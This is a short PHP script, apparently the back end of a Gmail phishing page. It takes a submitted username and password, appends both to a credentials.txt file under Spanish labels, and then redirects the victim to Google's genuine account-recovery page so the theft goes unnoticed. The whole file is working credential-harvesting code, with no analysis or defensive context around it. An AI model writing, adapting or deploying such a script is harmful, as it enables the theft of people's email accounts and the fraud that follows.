<?php

file_put_contents("credentials.txt", "[+] Gmail -> Usuario: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
?>
